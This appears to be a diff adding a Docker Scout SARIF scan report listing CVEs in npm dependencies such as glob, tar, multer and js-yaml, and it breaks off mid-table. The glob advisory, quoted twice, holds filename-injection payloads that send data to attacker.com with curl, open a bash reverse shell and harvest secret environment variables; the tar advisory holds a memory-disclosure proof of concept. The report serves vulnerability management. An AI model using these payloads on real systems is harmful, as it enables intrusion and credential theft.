@@ -1,0 +1,593 @@
+{
+  "version": "2.1.0",
+  "$schema": "https://raw.githubusercontent.com/oasis-tcs/sarif-spec/main/sarif-2.1/schema/sarif-schema-2.1.0.json",
+  "runs": [
+    {
+      "tool": {
+        "driver": {
+          "fullName": "Docker Scout",
+          "informationUri": "https://docker.com/products/docker-scout",
+          "name": "docker scout",
+          "rules": [
+            {
+              "id": "CVE-2025-5889",
+              "name": "OsPackageVulnerability",
+              "shortDescription": {
+                "text": "CVE-2025-5889: Uncontrolled Resource Consumption"
+              },
+              "helpUri": "https://scout.docker.com/v/CVE-2025-5889?s=github&n=brace-expansion&t=npm&vr=%3E%3D2.0.0%2C%3C%3D2.0.1",
+              "help": {
+                "text": "A vulnerability was found in juliangruber brace-expansion up to 1.1.11/2.0.1/3.0.0/4.0.0. It has been rated as problematic. Affected by this issue is the function expand of the file index.js. The manipulation leads to inefficient regular expression complexity. The attack may be launched remotely. The complexity of an attack is rather high. The exploitation is known to be difficult. The exploit has been disclosed to the public and may be used. Upgrading to version 1.1.12, 2.0.2, 3.0.1 and 4.0.1 is able to address this issue. The name of the patch is `a5b98a4f30d7813266b221435e1eaaf25a1b0ac5`. It is recommended to upgrade the affected component.\n",
+                "markdown": "> A vulnerability was found in juliangruber brace-expansion up to 1.1.11/2.0.1/3.0.0/4.0.0. It has been rated as problematic. Affected by this issue is the function expand of the file index.js. The manipulation leads to inefficient regular expression complexity. The attack may be launched remotely. The complexity of an attack is rather high. The exploitation is known to be difficult. The exploit has been disclosed to the public and may be used. Upgrading to version 1.1.12, 2.0.2, 3.0.1 and 4.0.1 is able to address this issue. The name of the patch is `a5b98a4f30d7813266b221435e1eaaf25a1b0ac5`. It is recommended to upgrade the affected component.\n\n|                |                                                                                                                                                                                |\n|----------------|--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|\n| Package        | pkg:npm/brace-expansion@2.0.1                                                                                                                                                  |\n| Affected range | >=2.0.0,<=2.0.1                                                                                                                                                                |\n| Fixed version  | 2.0.2                                                                                                                                                                          |\n| CVSS Score     |                                                                                                                                                                            1.3 |\n| CVSS Vector    | CVSS:4.0/AV:N/AC:H/AT:N/PR:L/UI:N/VC:N/VI:N/VA:L/SC:N/SI:N/SA:N/E:P/CR:X/IR:X/AR:X/MAV:X/MAC:X/MAT:X/MPR:X/MUI:X/MVC:X/MVI:X/MVA:X/MSC:X/MSI:X/MSA:X/S:X/AU:X/R:X/V:X/RE:X/U:X |\n"
+              },
+              "properties": {
+                "affected_version": ">=1.0.0,<=1.1.11",
+                "cvssV3": 1.3,
+                "cvssV3_severity": "LOW",
+                "cvssV3_vector": "CVSS:4.0/AV:N/AC:H/AT:N/PR:L/UI:N/VC:N/VI:N/VA:L/SC:N/SI:N/SA:N/E:P/CR:X/IR:X/AR:X/MAV:X/MAC:X/MAT:X/MPR:X/MUI:X/MVC:X/MVI:X/MVA:X/MSC:X/MSI:X/MSA:X/S:X/AU:X/R:X/V:X/RE:X/U:X",
+                "fixed_version": "1.1.12",
+                "purls": [
+                  "pkg:npm/brace-expansion@1.1.11",
+                  "pkg:npm/brace-expansion@2.0.1"
+                ],
+                "security-severity": "1.3",
+                "tags": [
+                  "LOW"
+                ]
+              }
+            },
+            {
+              "id": "CVE-2025-64718",
+              "name": "OsPackageVulnerability",
+              "shortDescription": {
+                "text": "CVE-2025-64718: Improperly Controlled Modification of Object Prototype Attributes ('Prototype Pollution')"
+              },
+              "helpUri": "https://scout.docker.com/v/CVE-2025-64718?s=github&n=js-yaml&t=npm&vr=%3E%3D4.0.0%2C%3C4.1.1",
+              "help": {
+                "text": "### Impact\n\nIn js-yaml 4.1.0, 4.0.0, and 3.14.1 and below, it's possible for an attacker to modify the prototype of the result of a parsed yaml document via prototype pollution (`__proto__`). All users who parse untrusted yaml documents may be impacted.\n\n### Patches\n\nProblem is patched in js-yaml 4.1.1 and 3.14.2.\n\n### Workarounds\n\nYou can protect against this kind of attack on the server by using `node --disable-proto=delete` or `deno` (in Deno, pollution protection is on by default).\n\n### References\n\nhttps://cheatsheetseries.owasp.org/cheatsheets/Prototype_Pollution_Prevention_Cheat_Sheet.html\n",
+                "markdown": "> ### Impact\n\nIn js-yaml 4.1.0, 4.0.0, and 3.14.1 and below, it's possible for an attacker to modify the prototype of the result of a parsed yaml document via prototype pollution (`__proto__`). All users who parse untrusted yaml documents may be impacted.\n\n### Patches\n\nProblem is patched in js-yaml 4.1.1 and 3.14.2.\n\n### Workarounds\n\nYou can protect against this kind of attack on the server by using `node --disable-proto=delete` or `deno` (in Deno, pollution protection is on by default).\n\n### References\n\nhttps://cheatsheetseries.owasp.org/cheatsheets/Prototype_Pollution_Prevention_Cheat_Sheet.html\n\n|                |                                              |\n|----------------|----------------------------------------------|\n| Package        | pkg:npm/js-yaml@4.1.0                        |\n| Affected range | >=4.0.0,<4.1.1                               |\n| Fixed version  | 4.1.1                                        |\n| CVSS Score     |                                          5.3 |\n| CVSS Vector    | CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N |\n"
+              },
+              "properties": {
+                "affected_version": ">=4.0.0,<4.1.1",
+                "cvssV3": 5.3,
+                "cvssV3_severity": "MEDIUM",
+                "cvssV3_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N",
+                "fixed_version": "4.1.1",
+                "purls": [
+                  "pkg:npm/js-yaml@4.1.0"
+                ],
+                "security-severity": "5.3",
+                "tags": [
+                  "MEDIUM"
+                ]
+              }
+            },
+            {
+              "id": "CVE-2024-29409",
+              "name": "OsPackageVulnerability",
+              "shortDescription": {
+                "text": "CVE-2024-29409: OWASP Top Ten 2017 Category A9 - Using Components with Known Vulnerabilities"
+              },
+              "helpUri": "https://scout.docker.com/v/CVE-2024-29409?s=gitlab&n=common&ns=%40nestjs&t=npm&vr=%3C11.0.16",
+              "help": {
+                "text": "File Upload vulnerability in nestjs nest prior to v.11.0.16 allows a remote attacker to execute arbitrary code via the Content-Type header.\n",
+                "markdown": "> File Upload vulnerability in nestjs nest prior to v.11.0.16 allows a remote attacker to execute arbitrary code via the Content-Type header.\n\n|                |                                              |\n|----------------|----------------------------------------------|\n| Package        | pkg:npm/%40nestjs/common@10.4.16             |\n| Affected range | <11.0.16                                     |\n| Fixed version  | 11.0.16                                      |\n| CVSS Score     |                                          5.5 |\n| CVSS Vector    | CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:U/C:L/I:L/A:L |\n"
+              },
+              "properties": {
+                "affected_version": "<11.0.16",
+                "cvssV3": 5.5,
+                "cvssV3_severity": "MEDIUM",
+                "cvssV3_vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:U/C:L/I:L/A:L",
+                "fixed_version": "11.0.16",
+                "purls": [
+                  "pkg:npm/%40nestjs/common@10.4.16"
+                ],
+                "security-severity": "5.5",
+                "tags": [
+                  "MEDIUM"
+                ]
+              }
+            },
+            {
+              "id": "CVE-2025-56200",
+              "name": "OsPackageVulnerability",
+              "shortDescription": {
+                "text": "CVE-2025-56200: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')"
+              },
+              "helpUri": "https://scout.docker.com/v/CVE-2025-56200?s=github&n=validator&t=npm&vr=%3C13.15.20",
+              "help": {
+                "text": "A URL validation bypass vulnerability exists in validator.js prior to version 13.15.20. The isURL() function uses '://' as a delimiter to parse protocols, while browsers use ':' as the delimiter. This parsing difference allows attackers to bypass protocol and domain validation by crafting URLs leading to XSS and Open Redirect attacks.\n",
+                "markdown": "> A URL validation bypass vulnerability exists in validator.js prior to version 13.15.20. The isURL() function uses '://' as a delimiter to parse protocols, while browsers use ':' as the delimiter. This parsing difference allows attackers to bypass protocol and domain validation by crafting URLs leading to XSS and Open Redirect attacks.\n\n|                |                                              |\n|----------------|----------------------------------------------|\n| Package        | pkg:npm/validator@13.15.0                    |\n| Affected range | <13.15.20                                    |\n| Fixed version  | 13.15.20                                     |\n| CVSS Score     |                                          6.1 |\n| CVSS Vector    | CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N |\n"
+              },
+              "properties": {
+                "affected_version": "<13.15.20",
+                "cvssV3": 6.1,
+                "cvssV3_severity": "MEDIUM",
+                "cvssV3_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N",
+                "fixed_version": "13.15.20",
+                "purls": [
+                  "pkg:npm/validator@13.15.0"
+                ],
+                "security-severity": "6.1",
+                "tags": [
+                  "MEDIUM"
+                ]
+              }
+            },
+            {
+              "id": "CVE-2025-64118",
+              "name": "OsPackageVulnerability",
+              "shortDescription": {
+                "text": "CVE-2025-64118: Concurrent Execution using Shared Resource with Improper Synchronization ('Race Condition')"
+              },
+              "helpUri": "https://scout.docker.com/v/CVE-2025-64118?s=github&n=tar&t=npm&vr=%3D7.5.1",
+              "help": {
+                "text": "### Summary\n\nUsing `.t` (aka `.list`) with `{ sync: true }` to read tar entry contents returns uninitialized memory contents if tar file was changed on disk to a smaller size while being read.\n\n### Details\n\nSee:\n* https://github.com/isaacs/node-tar/issues/445\n* https://github.com/isaacs/node-tar/pull/446\n* Regression happened in https://github.com/isaacs/node-tar/commit/5330eb04bc43014f216e5c271b40d5c00d45224d\n\n### PoC\n\nA:\n```js\nimport * as tar from 'tar'\nimport fs from 'node:fs'\n\nfs.writeFileSync('tar.test.tmp', Buffer.alloc(1*1024))\n\n// from readme\nconst filesAdded = []\ntar.c(\n  {\n    sync: true,\n    file: 'tar.test.tmp.tar',\n    onWriteEntry(entry) {\n      // initially, it's uppercase and 0o644\n      console.log('adding', entry.path, entry.stat.mode.toString(8))\n      // make all the paths lowercase\n      entry.path = entry.path.toLowerCase()\n      // make the entry executable\n      entry.stat.mode = 0o755\n      // in the archive, it's lowercase and 0o755\n      filesAdded.push([entry.path, entry.stat.mode.toString(8)])\n    },\n  },\n  ['./tar.test.tmp'],\n)\n\nconst a = fs.readFileSync('tar.test.tmp.tar')\n\nfor (let i = 0; ; i++){\n  if (i % 10000 === 0) console.log(i)\n  fs.writeFileSync('tar.test.tmp.tar', a)\n  fs.truncateSync('tar.test.tmp.tar', 600)\n}\n```\n\nB (vulnerable):\n```js\nimport * as tar from 'tar'\nimport * as fs from 'fs'\n\nwhile (true) {\n  fs.readFileSync(import.meta.filename)\n  tar.t({\n    sync: true,\n    file: 'tar.test.tmp.tar',\n    onReadEntry: e => e.on('data', b => {\n      const a = b.filter(x => x)\n      if (a.length > 0) console.log(a.toString())\n    })\n  })\n}\n```\n\nRun A and B in parallel on Node.js 22 or >=25.1.0\n\nDumps `B` memory (wait for some time to observe text data)\n\n### Impact\n\nExposes process memory and could result in e.g. unintentionally (aka attacker-controlled) attempting to process sensitive data rather than tar entry contents. Uninitialized memory can contain unrelated file contents, environment variables, passwords, etc.\n\nTo execute, an attacker must reduce the file size to boundary between a tar header and body block, in the time between when the tar archive file size is read via `stat`, and the time when the tar archive parser reaches the entry that is truncated. If the file is truncated at a different boundary, then the uninitialized data will very likely not be a valid tar entry, causing the parser to treat the entry as a damaged archive (that is, throwing an error in `strict: true` mode, or by default, skipping the entry harmlessly).\n\nThis is conditional on using the `sync: true` option to the `tar.list`/`tar.t` method, and the `7.5.1` version specifically. Earlier versions were not affected.\n\nThis is also conditional to attacker being able to truncate (or induce a truncation/replacement) of a file on disk (e.g. in cache).\n\nIf the tar file is initially larger than the `opt.maxReadSize` (16kb by default), then uninitialized memory is not exposed to user code, and instead the program enters an infinite loop, causing a DoS rather than an information disclosure vulnerability.\n\nBy default, `tar.list` does _not_ process tar archive entry body content. So, this is further conditional on the user code doing something with the tar entry file contents in an `onReadEntry` method which would expose the file contents (for example, attempting to parse them in such a way that the uninitialized data could appear in an error message).\n\nOther methods in this library (`tar.extract`, etc.) are not affected by this vulnerability.\n",
+                "markdown": "> ### Summary\n\nUsing `.t` (aka `.list`) with `{ sync: true }` to read tar entry contents returns uninitialized memory contents if tar file was changed on disk to a smaller size while being read.\n\n### Details\n\nSee:\n* https://github.com/isaacs/node-tar/issues/445\n* https://github.com/isaacs/node-tar/pull/446\n* Regression happened in https://github.com/isaacs/node-tar/commit/5330eb04bc43014f216e5c271b40d5c00d45224d\n\n### PoC\n\nA:\n```js\nimport * as tar from 'tar'\nimport fs from 'node:fs'\n\nfs.writeFileSync('tar.test.tmp', Buffer.alloc(1*1024))\n\n// from readme\nconst filesAdded = []\ntar.c(\n  {\n    sync: true,\n    file: 'tar.test.tmp.tar',\n    onWriteEntry(entry) {\n      // initially, it's uppercase and 0o644\n      console.log('adding', entry.path, entry.stat.mode.toString(8))\n      // make all the paths lowercase\n      entry.path = entry.path.toLowerCase()\n      // make the entry executable\n      entry.stat.mode = 0o755\n      // in the archive, it's lowercase and 0o755\n      filesAdded.push([entry.path, entry.stat.mode.toString(8)])\n    },\n  },\n  ['./tar.test.tmp'],\n)\n\nconst a = fs.readFileSync('tar.test.tmp.tar')\n\nfor (let i = 0; ; i++){\n  if (i % 10000 === 0) console.log(i)\n  fs.writeFileSync('tar.test.tmp.tar', a)\n  fs.truncateSync('tar.test.tmp.tar', 600)\n}\n```\n\nB (vulnerable):\n```js\nimport * as tar from 'tar'\nimport * as fs from 'fs'\n\nwhile (true) {\n  fs.readFileSync(import.meta.filename)\n  tar.t({\n    sync: true,\n    file: 'tar.test.tmp.tar',\n    onReadEntry: e => e.on('data', b => {\n      const a = b.filter(x => x)\n      if (a.length > 0) console.log(a.toString())\n    })\n  })\n}\n```\n\nRun A and B in parallel on Node.js 22 or >=25.1.0\n\nDumps `B` memory (wait for some time to observe text data)\n\n### Impact\n\nExposes process memory and could result in e.g. unintentionally (aka attacker-controlled) attempting to process sensitive data rather than tar entry contents. Uninitialized memory can contain unrelated file contents, environment variables, passwords, etc.\n\nTo execute, an attacker must reduce the file size to boundary between a tar header and body block, in the time between when the tar archive file size is read via `stat`, and the time when the tar archive parser reaches the entry that is truncated. If the file is truncated at a different boundary, then the uninitialized data will very likely not be a valid tar entry, causing the parser to treat the entry as a damaged archive (that is, throwing an error in `strict: true` mode, or by default, skipping the entry harmlessly).\n\nThis is conditional on using the `sync: true` option to the `tar.list`/`tar.t` method, and the `7.5.1` version specifically. Earlier versions were not affected.\n\nThis is also conditional to attacker being able to truncate (or induce a truncation/replacement) of a file on disk (e.g. in cache).\n\nIf the tar file is initially larger than the `opt.maxReadSize` (16kb by default), then uninitialized memory is not exposed to user code, and instead the program enters an infinite loop, causing a DoS rather than an information disclosure vulnerability.\n\nBy default, `tar.list` does _not_ process tar archive entry body content. So, this is further conditional on the user code doing something with the tar entry file contents in an `onReadEntry` method which would expose the file contents (for example, attempting to parse them in such a way that the uninitialized data could appear in an error message).\n\nOther methods in this library (`tar.extract`, etc.) are not affected by this vulnerability.\n\n|                |                                                                 |\n|----------------|-----------------------------------------------------------------|\n| Package        | pkg:npm/tar@7.5.1                                               |\n| Affected range | =7.5.1                                                          |\n| Fixed version  | 7.5.2                                                           |\n| CVSS Score     |                                                             6.1 |\n| CVSS Vector    | CVSS:4.0/AV:L/AC:H/AT:P/PR:L/UI:P/VC:H/VI:L/VA:L/SC:H/SI:H/SA:H |\n"
+              },
+              "properties": {
+                "affected_version": "=7.5.1",
+                "cvssV3": 6.1,
+                "cvssV3_severity": "MEDIUM",
+                "cvssV3_vector": "CVSS:4.0/AV:L/AC:H/AT:P/PR:L/UI:P/VC:H/VI:L/VA:L/SC:H/SI:H/SA:H",
+                "fixed_version": "7.5.2",
+                "purls": [
+                  "pkg:npm/tar@7.5.1"
+                ],
+                "security-severity": "6.1",
+                "tags": [
+                  "MEDIUM"
+                ]
+              }
+            },
+            {
+              "id": "CVE-2025-47935",
+              "name": "OsPackageVulnerability",
+              "shortDescription": {
+                "text": "CVE-2025-47935: Missing Release of Memory after Effective Lifetime"
+              },
+              "helpUri": "https://scout.docker.com/v/CVE-2025-47935?s=github&n=multer&t=npm&vr=%3C2.0.0",
+              "help": {
+                "text": "### Impact\n\nMulter <2.0.0 is vulnerable to a resource exhaustion and memory leak issue due to improper stream handling. When the HTTP request stream emits an error, the internal `busboy` stream is not closed, violating Node.js stream safety guidance.\n\nThis leads to unclosed streams accumulating over time, consuming memory and file descriptors. Under sustained or repeated failure conditions, this can result in denial of service, requiring manual server restarts to recover. All users of Multer handling file uploads are potentially impacted.\n\n\n### Patches\n\nUsers should upgrade to `2.0.0`\n\n\n### Workarounds\n\nNone\n\n### References\n\n- https://github.com/expressjs/multer/pull/1120\n- https://github.com/expressjs/multer/commit/2c8505f207d923dd8de13a9f93a4563e59933665\n",
+                "markdown": "> ### Impact\n\nMulter <2.0.0 is vulnerable to a resource exhaustion and memory leak issue due to improper stream handling. When the HTTP request stream emits an error, the internal `busboy` stream is not closed, violating Node.js stream safety guidance.\n\nThis leads to unclosed streams accumulating over time, consuming memory and file descriptors. Under sustained or repeated failure conditions, this can result in denial of service, requiring manual server restarts to recover. All users of Multer handling file uploads are potentially impacted.\n\n\n### Patches\n\nUsers should upgrade to `2.0.0`\n\n\n### Workarounds\n\nNone\n\n### References\n\n- https://github.com/expressjs/multer/pull/1120\n- https://github.com/expressjs/multer/commit/2c8505f207d923dd8de13a9f93a4563e59933665\n\n|                |                                              |\n|----------------|----------------------------------------------|\n| Package        | pkg:npm/multer@1.4.4-lts.1                   |\n| Affected range | <2.0.0                                       |\n| Fixed version  | 2.0.0                                        |\n| CVSS Score     |                                          7.5 |\n| CVSS Vector    | CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H |\n"
+              },
+              "properties": {
+                "affected_version": "<2.0.0",
+                "cvssV3": 7.5,
+                "cvssV3_severity": "HIGH",
+                "cvssV3_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
+                "fixed_version": "2.0.0",
+                "purls": [
+                  "pkg:npm/multer@1.4.4-lts.1"
+                ],
+                "security-severity": "7.5",
+                "tags": [
+                  "HIGH"
+                ]
+              }
+            },
+            {
+              "id": "CVE-2025-47944",
+              "name": "OsPackageVulnerability",
+              "shortDescription": {
+                "text": "CVE-2025-47944: Uncaught Exception"
+              },
+              "helpUri": "https://scout.docker.com/v/CVE-2025-47944?s=github&n=multer&t=npm&vr=%3E%3D1.4.4-lts.1%2C%3C2.0.0",
+              "help": {
+                "text": "### Impact\nA vulnerability in Multer versions >=1.4.4-lts.1 allows an attacker to trigger a Denial of Service (DoS) by sending a malformed multi-part upload request. This request causes an unhandled exception, leading to a crash of the process.\n\n### Patches\nUsers should upgrade to `2.0.0`\n\n### Workarounds\nNone\n\n### References\n\n- https://github.com/expressjs/multer/issues/1176\n- https://github.com/expressjs/multer/commit/2c8505f207d923dd8de13a9f93a4563e59933665\n",
+                "markdown": "> ### Impact\nA vulnerability in Multer versions >=1.4.4-lts.1 allows an attacker to trigger a Denial of Service (DoS) by sending a malformed multi-part upload request. This request causes an unhandled exception, leading to a crash of the process.\n\n### Patches\nUsers should upgrade to `2.0.0`\n\n### Workarounds\nNone\n\n### References\n\n- https://github.com/expressjs/multer/issues/1176\n- https://github.com/expressjs/multer/commit/2c8505f207d923dd8de13a9f93a4563e59933665\n\n|                |                                              |\n|----------------|----------------------------------------------|\n| Package        | pkg:npm/multer@1.4.4-lts.1                   |\n| Affected range | >=1.4.4-lts.1,<2.0.0                         |\n| Fixed version  | 2.0.0                                        |\n| CVSS Score     |                                          7.5 |\n| CVSS Vector    | CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H |\n"
+              },
+              "properties": {
+                "affected_version": ">=1.4.4-lts.1,<2.0.0",
+                "cvssV3": 7.5,
+                "cvssV3_severity": "HIGH",
+                "cvssV3_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
+                "fixed_version": "2.0.0",
+                "purls": [
+                  "pkg:npm/multer@1.4.4-lts.1"
+                ],
+                "security-severity": "7.5",
+                "tags": [
+                  "HIGH"
+                ]
+              }
+            },
+            {
+              "id": "CVE-2025-64756",
+              "name": "OsPackageVulnerability",
+              "shortDescription": {
+                "text": "CVE-2025-64756: Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')"
+              },
+              "helpUri": "https://scout.docker.com/v/CVE-2025-64756?s=github&n=glob&t=npm&vr=%3E%3D10.2.0%2C%3C10.5.0",
+              "help": {
+                "text": "### Summary\n\nThe glob CLI contains a command injection vulnerability in its `-c/--cmd` option that allows arbitrary command execution when processing files with malicious names. When `glob -c <command> <patterns>` is used, matched filenames are passed to a shell with `shell: true`, enabling shell metacharacters in filenames to trigger command injection and achieve arbitrary code execution under the user or CI account privileges.\n\n### Details\n\n**Root Cause:**\nThe vulnerability exists in `src/bin.mts:277` where the CLI collects glob matches and executes the supplied command using `foregroundChild()` with `shell: true`:\n\n```javascript\nstream.on('end', () => foregroundChild(cmd, matches, { shell: true }))\n```\n\n**Technical Flow:**\n1. User runs `glob -c <command> <pattern>` \n2. CLI finds files matching the pattern\n3. Matched filenames are collected into an array\n4. Command is executed with matched filenames as arguments using `shell: true`\n5. Shell interprets metacharacters in filenames as command syntax\n6. Malicious filenames execute arbitrary commands\n\n**Affected Component:**\n- **CLI Only:** The vulnerability affects only the command-line interface\n- **Library Safe:** The core glob library API (`glob()`, `globSync()`, streams/iterators) is not affected\n- **Shell Dependency:** Exploitation requires shell metacharacter support (primarily POSIX systems)\n\n**Attack Surface:**\n- Files with names containing shell metacharacters: `$()`, backticks, `;`, `&`, `|`, etc.\n- Any directory where attackers can control filenames (PR branches, archives, user uploads)\n- CI/CD pipelines using `glob -c` on untrusted content\n\n### PoC\n\n**Setup Malicious File:**\n```bash\nmkdir test_directory && cd test_directory\n\n# Create file with command injection payload in filename\ntouch '$(touch injected_poc)'\n```\n\n**Trigger Vulnerability:**\n```bash\n# Run glob CLI with -c option\nnode /path/to/glob/dist/esm/bin.mjs -c echo \"**/*\"\n```\n\n**Result:**\n- The echo command executes normally\n- **Additionally:** The `$(touch injected_poc)` in the filename is evaluated by the shell\n- A new file `injected_poc` is created, proving command execution\n- Any command can be injected this way with full user privileges\n\n**Advanced Payload Examples:**\n\n**Data Exfiltration:**\n```bash\n# Filename: $(curl -X POST https://attacker.com/exfil -d \"$(whoami):$(pwd)\" > /dev/null 2>&1)\ntouch '$(curl -X POST https://attacker.com/exfil -d \"$(whoami):$(pwd)\" > /dev/null 2>&1)'\n```\n\n**Reverse Shell:**\n```bash\n# Filename: $(bash -i >& /dev/tcp/attacker.com/4444 0>&1)\ntouch '$(bash -i >& /dev/tcp/attacker.com/4444 0>&1)'\n```\n\n**Environment Variable Harvesting:**\n```bash\n# Filename: $(env | grep -E \"(TOKEN|KEY|SECRET)\" > /tmp/secrets.txt)\ntouch '$(env | grep -E \"(TOKEN|KEY|SECRET)\" > /tmp/secrets.txt)'\n```\n\n### Impact\n\n**Arbitrary Command Execution:**\n- Commands execute with full privileges of the user running glob CLI\n- No privilege escalation required - runs as current user\n- Access to environment variables, file system, and network\n\n**Real-World Attack Scenarios:**\n\n**1. CI/CD Pipeline Compromise:**\n- Malicious PR adds files with crafted names to repository\n- CI pipeline uses `glob -c` to process files (linting, testing, deployment)\n- Commands execute in CI environment with build secrets and deployment credentials\n- Potential for supply chain compromise through artifact tampering\n\n**2. Developer Workstation Attack:**\n- Developer clones repository or extracts archive containing malicious filenames\n- Local build scripts use `glob -c` for file processing\n- Developer machine compromise with access to SSH keys, tokens, local services\n\n**3. Automated Processing Systems:**\n- Services using glob CLI to process uploaded files or external content\n- File uploads with malicious names trigger command execution\n- Server-side compromise with potential for lateral movement\n\n**4. Supply Chain Poisoning:**\n- Malicious packages or themes include files with crafted names\n- Build processes using glob CLI automatically process these files\n- Wide distribution of compromise through package ecosystems\n\n**Platform-Specific Risks:**\n- **POSIX/Linux/macOS:** High risk due to flexible filename characters and shell parsing\n- **Windows:** Lower risk due to filename restrictions, but vulnerability persists with PowerShell, Git Bash, WSL\n- **Mixed Environments:** CI systems often use Linux containers regardless of developer platform\n\n### Affected Products\n\n- **Ecosystem:** npm\n- **Package name:** glob\n- **Component:** CLI only (`src/bin.mts`)\n- **Affected versions:** v10.2.0 through v11.0.3 (and likely later versions until patched)\n- **Introduced:** v10.2.0 (first release with CLI containing `-c/--cmd` option)\n- **Patched versions:** 11.1.0and 10.5.0\n\n**Scope Limitation:**\n- **Library API Not Affected:** Core glob functions (`glob()`, `globSync()`, async iterators) are safe\n- **CLI-Specific:** Only the command-line interface with `-c/--cmd` option is vulnerable\n\n### Remediation\n\n- Upgrade to `glob@10.5.0`, `glob@11.1.0`, or higher, as soon as possible.\n- If any `glob` CLI actions fail, then convert commands containing positional arguments, to use the `--cmd-arg`/`-g` option instead.\n- As a last resort, use `--shell` to maintain `shell:true` behavior until glob v12, but take care to ensure that no untrusted contents can possibly be encountered in the file path results.\n",
+                "markdown": "> ### Summary\n\nThe glob CLI contains a command injection vulnerability in its `-c/--cmd` option that allows arbitrary command execution when processing files with malicious names. When `glob -c <command> <patterns>` is used, matched filenames are passed to a shell with `shell: true`, enabling shell metacharacters in filenames to trigger command injection and achieve arbitrary code execution under the user or CI account privileges.\n\n### Details\n\n**Root Cause:**\nThe vulnerability exists in `src/bin.mts:277` where the CLI collects glob matches and executes the supplied command using `foregroundChild()` with `shell: true`:\n\n```javascript\nstream.on('end', () => foregroundChild(cmd, matches, { shell: true }))\n```\n\n**Technical Flow:**\n1. User runs `glob -c <command> <pattern>` \n2. CLI finds files matching the pattern\n3. Matched filenames are collected into an array\n4. Command is executed with matched filenames as arguments using `shell: true`\n5. Shell interprets metacharacters in filenames as command syntax\n6. Malicious filenames execute arbitrary commands\n\n**Affected Component:**\n- **CLI Only:** The vulnerability affects only the command-line interface\n- **Library Safe:** The core glob library API (`glob()`, `globSync()`, streams/iterators) is not affected\n- **Shell Dependency:** Exploitation requires shell metacharacter support (primarily POSIX systems)\n\n**Attack Surface:**\n- Files with names containing shell metacharacters: `$()`, backticks, `;`, `&`, `|`, etc.\n- Any directory where attackers can control filenames (PR branches, archives, user uploads)\n- CI/CD pipelines using `glob -c` on untrusted content\n\n### PoC\n\n**Setup Malicious File:**\n```bash\nmkdir test_directory && cd test_directory\n\n# Create file with command injection payload in filename\ntouch '$(touch injected_poc)'\n```\n\n**Trigger Vulnerability:**\n```bash\n# Run glob CLI with -c option\nnode /path/to/glob/dist/esm/bin.mjs -c echo \"**/*\"\n```\n\n**Result:**\n- The echo command executes normally\n- **Additionally:** The `$(touch injected_poc)` in the filename is evaluated by the shell\n- A new file `injected_poc` is created, proving command execution\n- Any command can be injected this way with full user privileges\n\n**Advanced Payload Examples:**\n\n**Data Exfiltration:**\n```bash\n# Filename: $(curl -X POST https://attacker.com/exfil -d \"$(whoami):$(pwd)\" > /dev/null 2>&1)\ntouch '$(curl -X POST https://attacker.com/exfil -d \"$(whoami):$(pwd)\" > /dev/null 2>&1)'\n```\n\n**Reverse Shell:**\n```bash\n# Filename: $(bash -i >& /dev/tcp/attacker.com/4444 0>&1)\ntouch '$(bash -i >& /dev/tcp/attacker.com/4444 0>&1)'\n```\n\n**Environment Variable Harvesting:**\n```bash\n# Filename: $(env | grep -E \"(TOKEN|KEY|SECRET)\" > /tmp/secrets.txt)\ntouch '$(env | grep -E \"(TOKEN|KEY|SECRET)\" > /tmp/secrets.txt)'\n```\n\n### Impact\n\n**Arbitrary Command Execution:**\n- Commands execute with full privileges of the user running glob CLI\n- No privilege escalation required - runs as current user\n- Access to environment variables, file system, and network\n\n**Real-World Attack Scenarios:**\n\n**1. CI/CD Pipeline Compromise:**\n- Malicious PR adds files with crafted names to repository\n- CI pipeline uses `glob -c` to process files (linting, testing, deployment)\n- Commands execute in CI environment with build secrets and deployment credentials\n- Potential for supply chain compromise through artifact tampering\n\n**2. Developer Workstation Attack:**\n- Developer clones repository or extracts archive containing malicious filenames\n- Local build scripts use `glob -c` for file processing\n- Developer machine compromise with access to SSH keys, tokens, local services\n\n**3. Automated Processing Systems:**\n- Services using glob CLI to process uploaded files or external content\n- File uploads with malicious names trigger command execution\n- Server-side compromise with potential for lateral movement\n\n**4. Supply Chain Poisoning:**\n- Malicious packages or themes include files with crafted names\n- Build processes using glob CLI automatically process these files\n- Wide distribution of compromise through package ecosystems\n\n**Platform-Specific Risks:**\n- **POSIX/Linux/macOS:** High risk due to flexible filename characters and shell parsing\n- **Windows:** Lower risk due to filename restrictions, but vulnerability persists with PowerShell, Git Bash, WSL\n- **Mixed Environments:** CI systems often use Linux containers regardless of developer platform\n\n### Affected Products\n\n- **Ecosystem:** npm\n- **Package name:** glob\n- **Component:** CLI only (`src/bin.mts`)\n- **Affected versions:** v10.2.0 through v11.0.3 (and likely later versions until patched)\n- **Introduced:** v10.2.0 (first release with CLI containing `-c/--cmd` option)\n- **Patched versions:** 11.1.0and 10.5.0\n\n**Scope Limitation:**\n- **Library API Not Affected:** Core glob functions (`glob()`, `globSync()`, async iterators) are safe\n- **CLI-Specific:** Only the command-line interface with `-c/--cmd` option is vulnerable\n\n### Remediation\n\n- Upgrade to `glob@10.5.0`, `glob@11.1.0`, or higher, as soon as possible.\n- If any `glob` CLI actions fail, then convert commands containing positional arguments, to use the `--cmd-arg`/`-g` option instead.\n- As a last resort, use `--shell` to maintain `shell:true` behavior until glob v12, but take care to ensure that no untrusted contents can possibly be encountered in the file path results.\n\n|                |                                              |\n|----------------|----------------------------------------------|\n| Package        | pkg:npm/glob@10.4.5                          |\n| Affected range | >=10.2.0,<10.5.0                             |\n| Fixed version  | 11.1.0                                       |\n| CVSS Score     |                                          7.5 |\n| CVSS Vector    | 